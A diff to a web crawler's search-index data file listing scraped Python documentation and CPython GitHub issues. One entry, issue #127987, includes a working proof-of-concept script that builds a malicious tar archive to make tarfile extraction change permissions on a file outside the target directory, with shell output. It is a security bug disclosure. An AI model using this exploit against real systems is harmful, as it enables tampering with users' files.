@@ -1,5 +1,40 @@
 window.searchData = [
   {
+    "id": 1562,
+    "url": "https://github.com/python/cpython/issues/127987",
+    "title": "TarFile.extractall(..., filter\u003d\u0027tar\u0027) arbitrary file chmod · Issue #127987 · python/cpython · GitHub",
+    "content": "Skip to content You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert {{ message }} TarFile.extractall(..., filter\u003d\u0027tar\u0027) arbitrary file chmod #127987 New issue Copy link New issue Copy link Closed Closed TarFile.extractall(..., filter\u003d\u0027tar\u0027) arbitrary file chmod#127987 Copy link Labels 3.10 (EOL)end of lifeend of life3.11only security fixesonly security fixes3.12only security fixesonly security fixes3.13only security fixesonly security fixes3.14bugs and security fixesbugs and security fixes3.9 (EOL)end of lifeend of lifestdlibStandard Library Python modules in the Lib/ directoryStandard Library Python modules in the Lib/ directorytype-bugAn unexpected behavior, bug, or errorAn unexpected behavior, bug, or errortype-securityA security issueA security issue Description jwilk opened on Dec 16, 2024 Issue body actions TarFile.extractall() can be tricked into chmodding arbitrary file (outside of the destination directory) to 0755, despite using filter\u003d\u0027tar\u0027: $ target\u003d$(mktemp)\n$ defeatpep706 eggs.tar $target\n$ ls -l $target\n-rw------- 1 jwilk jwilk 0 Dec 16 12:00 /tmp/tmp.uxCZC0Zs3F\n$ python3 -m tarfile --filter\u003dtar -e eggs.tar $(mktemp -d)\n$ ls -l $target\n-rwxr-xr-x 1 jwilk jwilk 0 Jan  1  1970 /tmp/tmp.uxCZC0Zs3F filter\u003d\u0027data\u0027 is vulnerable too, although in that case the damage is limited to updating the file timestamp: $ target\u003d$(mktemp)\n$ defeatpep706 eggs.tar $target\n$ ls -l $target\n-rw------- 1 jwilk jwilk 0 Dec 16 12:01 /tmp/tmp.WeCifOsQmp\n$ python3.12 -m tarfile --filter\u003ddata -e eggs.tar $(mktemp -d)\n$ ls -l $target\n-rw------- 1 jwilk jwilk 0 Jan  1  1970 /tmp/tmp.WeCifOsQmp Here\u0027s the source for the defeatpep706 script: #!/usr/bin/python3\n\nimport argparse\nimport os\nimport tarfile\n\nap \u003d arparse \u003d argparse.ArgumentParser()\nap.add_argument(\u0027tarpath\u0027, metavar\u003d\u0027TARBALL\u0027)\nap.add_argument(\u0027target\u0027, metavar\u003d\u0027TARGET\u0027)\nopts \u003d ap.parse_args()\ntarget \u003d os.path.abspath(opts.target)\n\nwith tarfile.open(opts.tarpath, \u0027w\u0027) as tar:\n\n    def addmemb(name, **kwargs):\n        memb \u003d tarfile.TarInfo(name)\n        for k, v in kwargs.items():\n            getattr(memb, k)\n            setattr(memb, k, v)\n        tar.addfile(memb)\n\n    # lrw-r--r-- pwn -\u003e .\n    addmemb(\u0027pwn\u0027, type\u003dtarfile.SYMTYPE, linkname\u003d\u0027.\u0027)\n    # \"pwn\" is a very innocent symlink.\n\n    # drwxrwxrwx pwn/\n    addmemb(\u0027pwn\u0027, type\u003dtarfile.DIRTYPE, mode\u003d0o777)\n    # But now \"pwn\" is also a directory, so it\u0027s scheduled to have its\n    # metadata updated later.\n\n    # lrw-r--r-- pwn -\u003e x/x/x/x/⋯⋯⋯/x/../../../../⋯⋯⋯/../TARGET\n    addmemb(\u0027pwn\u0027, type\u003dtarfile.SYMTYPE, linkname\u003d(\u0027x/\u0027 * 99 + \u0027../\u0027 * 99 + target))\n    # Oops, \"pwn\" is not so innocent any more.\n    # But technically it\u0027s still pointing inside the dest dir,\n    # so it doesn\u0027t upset the \"data\" filter.\n\n    # lrw-r--r-- x/x/x/x/⋯⋯⋯/x -\u003e ../../../⋯⋯⋯/..\n    addmemb((\u0027x/\u0027 * 99), type\u003dtarfile.SYMTYPE, linkname\u003d(\u0027../\u0027 * 98))\n    # The newly created symlink symlink points to the dest dir,\n    # so it\u0027s OK for the \"data\" filter.\n    # But now \"pwn\" points to the target (outside the dest dir). Tested with Python 3.12.8. Linked PRs gh-127987: Ensure that directories are not renamed during tar.TarFile.extractall() #134628 Reactions are currently unavailable Activity Sign up for free to join this conversation on GitHub. Already have an account? Sign in to comment Metadata Metadata Assignees No one assigned Labels 3.10 (EOL)end of lifeend of life3.11only security fixesonly security fixes3.12only security fixesonly security fixes3.13only security fixesonly security fixes3.14bugs and security fixesbugs and security fixes3.9 (EOL)end of lifeend of lifestdlibStandard Library Python modules in the Lib/ directoryStandard Library Python modules in the Lib/ directorytype-bugAn unexpected behavior, bug, or errorAn unexpected behavior, bug, or errortype-securityA security issueA security issue Projects Tarfile issues 🗄️ Status Done Show more project fields Milestone No milestone Relationships None yet Development No branches or pull requests Issue actions Open in GitHub Copilot app You can’t perform that action at this time.",
+    "scrapedAt": "2026-10-08 19:47:52.934075"
+  },
+  {
+    "id": 1561,
+    "url": "https://docs.python.org/3/library/pickle.html#module-pickle",
+    "title": "pickle — Python object serialization — Python 3.14.8 documentation",
+    "content": "Navigation index modules | next | previous | Python » 3.14.8 Documentation » The Python standard library » Data Persistence » pickle — Python object serialization | Theme Auto Light Dark | pickle — Python object serialization¶ Source code: Lib/pickle.py The pickle module implements binary protocols for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. Pickling (and unpickling) is alternatively known as “serialization”, “marshalling,” [1] or “flattening”; however, to avoid confusion, the terms used here are “pickling” and “unpickling”. Warning The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with. Consider signing data with hmac if you need to ensure that it has not been tampered with. Safer serialization formats such as json may be more appropriate if you are processing untrusted data. See Comparison with json. Relationship to other Python modules¶ Comparison with marshal¶ Python has a more primitive serialization module called marshal, but in general pickle should always be the preferred way to serialize Python objects. marshal exists primarily to support Python’s .pyc files. The pickle module differs from marshal in several significant ways: marshal cannot be used to serialize user-defined classes and their instances. pickle can save and restore class instances transparently, however the class definition must be importable and live in the same module as when the object was pickled. The marshal serialization format is not guaranteed to be portable across Python versions. Because its primary job in life is to support .pyc files, the Python implementers reserve the right to change the serialization format in non-backwards compatible ways should the need arise. The pickle serialization format is guaranteed to be backwards compatible across Python releases provided a compatible pickle protocol is chosen and pickling and unpickling code deals with Python 2 to Python 3 type differences if your data is crossing that unique breaking change language boundary. Comparison with json¶ There are fundamental differences between the pickle protocols and JSON (JavaScript Object Notation): JSON is a text serialization format (it outputs unicode text, although most of the time it is then encoded to utf-8), while pickle is a binary serialization format; JSON is human-readable, while pickle is not; JSON is interoperable and widely used outside of the Python ecosystem, while pickle is Python-specific; JSON, by default, can only represent a subset of the Python built-in types, and no custom classes; pickle can represent an extremely large number of Python types (many of them automatically, by clever usage of Python’s introspection facilities; complex cases can be tackled by implementing specific object APIs); Unlike pickle, deserializing untrusted JSON does not in itself create an arbitrary code execution vulnerability. See also The json module: a standard library module allowing JSON serialization and deserialization. Data stream format¶ The data format used by pickle is Python-specific. This has the advantage that there are no restrictions imposed by external standards such as JSON (which can’t represent pointer sharing); however it means that non-Python programs may not be able to reconstruct pickled Python objects. By default, the pickle data format uses a relatively compact binary representation. If you need optimal size characteristics, you can efficiently compress pickled data. The module pickletools contains tools for analyzing data streams generated by pickle. pickletools source code has extensive comments about opcodes used by pickle protocols. There are currently 6 different protocols which can be used for pickling. The higher the protocol used, the more recent the version of Python needed to read the pickle produced. Protocol version 0 is the original “human-readable” protocol and is backwards compatible with earlier versions of Python. Protocol version 1 is an old binary format which is also compatible with earlier versions of Python. Protocol version 2 was introduced in Python 2.3. It provides much more efficient pickling of new-style classes. Refer to PEP 307 for information about improvements brought by protocol 2. Protocol version 3 was added in Python 3.0. It has explicit support for bytes objects and cannot be unpickled by Python 2.x. This was the default protocol in Python 3.0–3.7. Protocol version 4 was added in Python 3.4. It adds support for very large objects, pickling more kinds of objects, and some data format optimizations. This was the defau",
+    "scrapedAt": "2026-10-08 19:47:50.875488"
+  },
+  {
+    "id": 1559,
+    "url": "https://github.com/python/cpython/issues/126899",
+    "title": "Add `**kw` to `tkinter.Misc.after` and `tkinter.Misc.after_idle` · Issue #126899 · python/cpython · GitHub",
+    "content": "Skip to content You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert {{ message }} Add **kw to tkinter.Misc.after and tkinter.Misc.after_idle #126899 New issue Copy link New issue Copy link Closed Closed Add **kw to tkinter.Misc.after and tkinter.Misc.after_idle#126899 Copy link Labels stdlibStandard Library Python modules in the Lib/ directoryStandard Library Python modules in the Lib/ directorytopic-tkintertype-featureA feature request or enhancementA feature request or enhancement Description Xiaokang2022 opened on Nov 16, 2024 Issue body actions Feature or enhancement Proposal: Add the argument **kw to the method after so that the keyword argument can passed to func Conveniently. The current function definition of the after is as follows: def after(self, ms, func\u003dNone, *args): ... If we have the argument **kw, we can do this: import tkinter\n\nroot \u003d tkinter.Tk()\nroot.after(1000, root.configure, bg\u003d\"red\")\nroot.mainloop() Otherwise, we may need something like this: import tkinter\n\nroot \u003d tkinter.Tk()\nroot.after(1000, lambda: root.configure(bg\u003d\"red\"))\nroot.mainloop() Obviously, the lambda here looks a bit redundant. Has this already been discussed elsewhere? This is a minor feature, which does not need previous discussion elsewhere Links to previous discussion of this feature: No response Linked PRs gh-126899: Add **kw to tkinter.Misc.after and tkinter.Misc.after_idle #126900 Reactions are currently unavailable Activity Sign up for free to join this conversation on GitHub. Already have an account? Sign in to comment Metadata Metadata Assignees No one assigned Labels stdlibStandard Library Python modules in the Lib/ directoryStandard Library Python modules in the Lib/ directorytopic-tkintertype-featureA feature request or enhancementA feature request or enhancement Projects No projects Milestone No milestone Relationships None yet Development No branches or pull requests Issue actions Open in GitHub Copilot app You can’t perform that action at this time.",
+    "scrapedAt": "2026-10-08 19:47:49.459993"
+  },
+  {
+    "id": 1558,
+    "url": "https://github.com/python/cpython/issues/107954",
+    "title": "[C API] PEP 741: Add PyInitConfig C API to customize the Python initialization · Issue #107954 · python/cpython · GitHub",
+    "content": "Skip to content You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert {{ message }} [C API] PEP 741: Add PyInitConfig C API to customize the Python initialization #107954 New issue Copy link New issue Copy link Closed Closed [C API] PEP 741: Add PyInitConfig C API to customize the Python initialization#107954 Copy link Labels topic-C-APItype-featureA feature request or enhancementA feature request or enhancement Description vstinner opened on Aug 14, 2023 Issue body actions Links to previous discussion of this feature: https://discuss.python.org/t/fr-allow-private-runtime-config-to-enable-extending-without-breaking-the-pyconfig-abi/18004 Summary of proposal: Add a text-based configuration to Python initialization Pitch: An API should be added to the limited C API customize the Python initialization (PyConfig API, PEP 587). The problem is that the PyConfig C API is excluded from the limited C API, whereas the legacy initialization API is deprecated (ex: Py_VerboseFlag in Python 3.12) and being removed in Python 3.13 (ex: PySys_SetPath()). Linked PRs [WIP] gh-107954: Add _PyConfig_Parse() #110145 gh-107954: Refactor initconfig.c: add CONFIG_SPEC #110146 [PEP 741] gh-107954: Add PyInitConfig C API #110176 [PEP 741] gh-107954: Add PyConfig_Get() function #112609 gh-107954: Add PyConfig_MEMBER_BOOL type to PyConfigSpec #116359 gh-107954, PEP 741: Add PyConfig_Get() function #123472 gh-107954, PEP 741: Add PyInitConfig C API #123502 gh-107954, PEP 741: Adjust Python initialization config #123663 gh-107954, PEP 741: Add PyInitConfig_AddModule() function #123668 gh-107954: Fix configuration type for the perf profiler #124636 gh-107954: Document PEP 741 in What\u0027s New 3.14 #127056 gh-107954: Allow setting cpu_count in PyConfig_Set() #132954 gh-107954: Add audit event to PyConfig_Set() #132958 Reactions are currently unavailable Activity Sign up for free to join this conversation on GitHub. Already have an account? Sign in to comment Metadata Metadata Assignees No one assigned Labels topic-C-APItype-featureA feature request or enhancementA feature request or enhancement Projects No projects Milestone No milestone Relationships None yet Development No branches or pull requests Issue actions Open in GitHub Copilot app You can’t perform that action at this time.",
+    "scrapedAt": "2026-10-08 19:47:47.205697"
+  },
+  {
+    "id": 1557,
+    "url": "https://docs.python.org/3/library/concurrent.futures.html#concurrent.futures.ProcessPoolExecutor",
+    "title": "concurrent.futures — Launching parallel tasks — Python 3.14.8 documentation",
+    "content": "Navigation index modules | next | previous | Python » 3.14.8 Documentation » The Python standard library » Concurrent Execution » concurrent.futures — Launching parallel tasks | Theme Auto Light Dark | concurrent.futures — Launching parallel tasks¶ Added in version 3.2. Source code: Lib/concurrent/futures/thread.py, Lib/concurrent/futures/process.py, and Lib/concurrent/futures/interpreter.py The concurrent.futures module provides a high-level interface for asynchronously executing callables. The asynchronous execution can be performed with threads, using ThreadPoolExecutor or InterpreterPoolExecutor, or separate processes, using ProcessPoolExecutor. Each implements the same interface, which is defined by the abstract Executor class. concurrent.futures.Future must not be confused with asyncio.Future, which is designed for use with asyncio tasks and coroutines. See the asyncio’s Future documentation for a detailed comparison of the two. Availability: not WASI. This module does not work or is not available on WebAssembly. See WebAssembly platforms for more information. Executor Objects¶ class concurrent.futures.Executor¶ An abstract class that provides methods to execute calls asynchronously. It should not be used directly, but through its concrete subclasses. submit(fn, /, *args, **kwargs)¶ Schedules the callable, fn, to be executed as fn(*args, **kwargs) and returns a Future object representing the execution of the callable. with ThreadPoolExecutor(max_workers\u003d1) as executor:\n    future \u003d executor.submit(pow, 323, 1235)\n    print(future.result())\n map(fn, *iterables, timeout\u003dNone, chunksize\u003d1, buffersize\u003dNone)¶ Similar to map(fn, *iterables) except: The iterables are collected immediately rather than lazily, unless a buffersize is specified to limit the number of submitted tasks whose results have not yet been yielded. If the buffer is full, iteration over the iterables pauses until a result is yielded from the buffer. fn is executed asynchronously and several calls to fn may be made concurrently. The returned iterator raises a TimeoutError if __next__() is called and the result isn’t available after timeout seconds from the original call to Executor.map(). timeout can be an int or a float. If timeout is not specified or None, there is no limit to the wait time. If a fn call raises an exception, then that exception will be raised when its value is retrieved from the iterator. When using ProcessPoolExecutor, this method chops iterables into a number of chunks which it submits to the pool as separate tasks. The (approximate) size of these chunks can be specified by setting chunksize to a positive integer. For very long iterables, using a large value for chunksize can significantly improve performance compared to the default size of 1. With ThreadPoolExecutor and InterpreterPoolExecutor, chunksize has no effect. Changed in version 3.5: Added the chunksize parameter. Changed in version 3.14: Added the buffersize parameter. shutdown(wait\u003dTrue, *, cancel_futures\u003dFalse)¶ Signal the executor that it should free any resources that it is using when the currently pending futures are done executing. Calls to Executor.submit() and Executor.map() made after shutdown will raise RuntimeError. If wait is True then this method will not return until all the pending futures are done executing and the resources associated with the executor have been freed. If wait is False then this method will return immediately and the resources associated with the executor will be freed when all pending futures are done executing. Regardless of the value of wait, the entire Python program will not exit until all pending futures are done executing. If cancel_futures is True, this method will cancel all pending futures that the executor has not started running. Any futures that are completed or running won’t be cancelled, regardless of the value of cancel_futures. If both cancel_futures and wait are True, all futures that the executor has started running will be completed prior to this method returning. The remaining futures are cancelled. You can avoid having to call this method explicitly if you use the executor as a context manager via the with statement, which will shutdown the Executor (waiting as if Executor.shutdown() were called with wait set to True): import shutil\nwith ThreadPoolExecutor(max_workers\u003d4) as e:\n    e.submit(shutil.copy, \u0027src1.txt\u0027, \u0027dest1.txt\u0027)\n    e.submit(shutil.copy, \u0027src2.txt\u0027, \u0027dest2.txt\u0027)\n    e.submit(shutil.copy, \u0027src3.txt\u0027, \u0027dest3.txt\u0027)\n    e.submit(shutil.copy, \u0027src4.txt\u0027, \u0027dest4.txt\u0027)\n Changed in version 3.9: Added cancel_futures. ThreadPoolExecutor¶ ThreadPoolExecutor is an Executor subclass that uses a pool of threads to execute calls asynchronously. Deadlocks can occur when the callable associated with a Future waits on the results of another Future. For example: import time\ndef wait_on_b():\n    time.sleep(5)\n    print(b.result())  # b will never complete because it is waiting on a.\n    return 5\n\ndef wait_on",
+    "scrapedAt": "2026-10-08 19:47:44.869132"
+  },
+  {
     "id": 1556,
     "url": "https://docs.python.org/3/library/ctypes.html#ctypes.Structure._pack_",
     "title": "ctypes — A foreign function library for Python — Python 3.14.8 documentation",
@@ -10465,26 +10500,6 @@ window.searchData = [
     "id": 1,
     "url": "https://meowcat.site",
     "scrapedAt": "2026-10-08 18:45:24.045334"
-  },
-  {
-    "id": 1557,
-    "url": "https://docs.python.org/3/library/concurrent.futures.html#concurrent.futures.ProcessPoolExecutor"
-  },
-  {
-    "id": 1558,
-    "url": "https://github.com/python/cpython/issues/107954"
-  },
-  {
-    "id": 1559,
-    "url": "https://github.com/python/cpython/issues/126899"
-  },
-  {
-    "id": 1561,
-    "url": "https://docs.python.org/3/library/pickle.html#module-pickle"
-  },
-  {
-    "id": 1562,
-    "url": "https://github.com/python/cpython/issues/127987"
   },
   {
     "id": 1563,
@@ -246481,10 +246496,210 @@ window.searchData = [
     "id": 335738,
     "url": "https://github.com/python/cpython/pull/125563#event-14695690626",
     "parentUrl": "https://github.com/python/cpython/issues/125563"
+  },
+  {
+    "id": 336083,
+    "url": "https://github.com/python/cpython/pull/112609",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336084,
+    "url": "https://github.com/python/cpython/pull/127056",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336086,
+    "url": "https://github.com/python/cpython/pull/132954",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336087,
+    "url": "https://github.com/python/cpython/issues/107954#issue-1850673514",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336088,
+    "url": "https://github.com/python/cpython/issues/107954#start-of-content",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336089,
+    "url": "https://github.com/python/cpython/issues/107954#top",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336090,
+    "url": "https://github.com/python/cpython/pull/132958",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336091,
+    "url": "https://github.com/python/cpython/pull/110146",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336092,
+    "url": "https://github.com/python/cpython/pull/110176",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336093,
+    "url": "https://github.com/login?return_to\u003dhttps://github.com/python/cpython/issues/107954",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336096,
+    "url": "https://github.com/python/cpython/pull/110145",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336098,
+    "url": "https://github.com/python/cpython/pull/116359",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336101,
+    "url": "https://github.com/python/cpython/pull/123668",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336102,
+    "url": "https://github.com/python/cpython/pull/124636",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336104,
+    "url": "https://github.com/signup?return_to\u003dhttps://github.com/python/cpython/issues/107954",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336105,
+    "url": "https://github.com/python/cpython/pull/123663",
+    "parentUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "id": 336108,
+    "url": "https://github.com/signup?return_to\u003dhttps://github.com/python/cpython/issues/126899",
+    "parentUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "id": 336109,
+    "url": "https://github.com/login?return_to\u003dhttps://github.com/python/cpython/issues/126899",
+    "parentUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "id": 336111,
+    "url": "https://github.com/python/cpython/issues/126899#start-of-content",
+    "parentUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "id": 336112,
+    "url": "https://github.com/python/cpython/issues/126899#top",
+    "parentUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "id": 336113,
+    "url": "https://github.com/python/cpython/issues/126899#issue-2664179870",
+    "parentUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "id": 336115,
+    "url": "https://github.com/python/cpython/pull/126900",
+    "parentUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "id": 336266,
+    "url": "https://github.com/python/cpython/pull/134628",
+    "parentUrl": "https://github.com/python/cpython/issues/127987"
+  },
+  {
+    "id": 336267,
+    "url": "https://github.com/signup?return_to\u003dhttps://github.com/python/cpython/issues/127987",
+    "parentUrl": "https://github.com/python/cpython/issues/127987"
+  },
+  {
+    "id": 336268,
+    "url": "https://github.com/python/cpython/issues/127987#start-of-content",
+    "parentUrl": "https://github.com/python/cpython/issues/127987"
+  },
+  {
+    "id": 336271,
+    "url": "https://github.com/python/cpython/issues/127987#issue-2742373893",
+    "parentUrl": "https://github.com/python/cpython/issues/127987"
+  },
+  {
+    "id": 336275,
+    "url": "https://github.com/login?return_to\u003dhttps://github.com/python/cpython/issues/127987",
+    "parentUrl": "https://github.com/python/cpython/issues/127987"
+  },
+  {
+    "id": 336276,
+    "url": "https://github.com/python/cpython/issues/127987#top",
+    "parentUrl": "https://github.com/python/cpython/issues/127987"
   }
 ];
 
 window.imageData = [
+  {
+    "src": "https://avatars.githubusercontent.com/u/141546?v\u003d4\u0026size\u003d48",
+    "alt": "@jwilk",
+    "pageTitle": "TarFile.extractall(..., filter\u003d\u0027tar\u0027) arbitrary file chmod · Issue #127987 · python/cpython · GitHub",
+    "pageUrl": "https://github.com/python/cpython/issues/127987"
+  },
+  {
+    "src": "https://github.githubassets.com/assets/github-copilot-app-light-15ad5534265eeacd.svg",
+    "alt": "",
+    "pageTitle": "TarFile.extractall(..., filter\u003d\u0027tar\u0027) arbitrary file chmod · Issue #127987 · python/cpython · GitHub",
+    "pageUrl": "https://github.com/python/cpython/issues/127987"
+  },
+  {
+    "src": "https://docs.python.org/3/_static/py.svg",
+    "alt": "Python logo",
+    "pageTitle": "pickle — Python object serialization — Python 3.14.8 documentation",
+    "pageUrl": "https://docs.python.org/3/library/pickle.html#module-pickle"
+  },
+  {
+    "src": "https://docs.python.org/3/_static/py.svg",
+    "alt": "Python logo",
+    "pageTitle": "pickle — Python object serialization — Python 3.14.8 documentation",
+    "pageUrl": "https://docs.python.org/3/library/pickle.html#module-pickle"
+  },
+  {
+    "src": "https://avatars.githubusercontent.com/u/100004682?u\u003d8dbadbcbfc6f216f76a8b6f94fe25c12d4e4093b\u0026v\u003d4\u0026size\u003d48",
+    "alt": "@Xiaokang2022",
+    "pageTitle": "Add `**kw` to `tkinter.Misc.after` and `tkinter.Misc.after_idle` · Issue #126899 · python/cpython · GitHub",
+    "pageUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "src": "https://github.githubassets.com/assets/github-copilot-app-light-15ad5534265eeacd.svg",
+    "alt": "",
+    "pageTitle": "Add `**kw` to `tkinter.Misc.after` and `tkinter.Misc.after_idle` · Issue #126899 · python/cpython · GitHub",
+    "pageUrl": "https://github.com/python/cpython/issues/126899"
+  },
+  {
+    "src": "https://avatars.githubusercontent.com/u/194129?u\u003dcf52678f5f02f96d9c5bc1b5079d4e6c2e441af4\u0026v\u003d4\u0026size\u003d48",
+    "alt": "@vstinner",
+    "pageTitle": "[C API] PEP 741: Add PyInitConfig C API to customize the Python initialization · Issue #107954 · python/cpython · GitHub",
+    "pageUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "src": "https://github.githubassets.com/assets/github-copilot-app-light-15ad5534265eeacd.svg",
+    "alt": "",
+    "pageTitle": "[C API] PEP 741: Add PyInitConfig C API to customize the Python initialization · Issue #107954 · python/cpython · GitHub",
+    "pageUrl": "https://github.com/python/cpython/issues/107954"
+  },
+  {
+    "src": "https://docs.python.org/3/_static/py.svg",
+    "alt": "Python logo",
+    "pageTitle": "concurrent.futures — Launching parallel tasks — Python 3.14.8 documentation",
+    "pageUrl": "https://docs.python.org/3/library/concurrent.futures.html#concurrent.futures.ProcessPoolExecutor"
+  },
+  {
+    "src": "https://docs.python.org/3/_static/py.svg",
+    "alt": "Python logo",
+    "pageTitle": "concurrent.futures — Launching parallel tasks — Python 3.14.8 documentation",
+    "pageUrl": "https://docs.python.org/3/library/concurrent.futures.html#concurrent.futures.ProcessPoolExecutor"
+  },
   {
     "src": "https://docs.python.org/3/_static/py.svg",
     "alt": "Python logo",
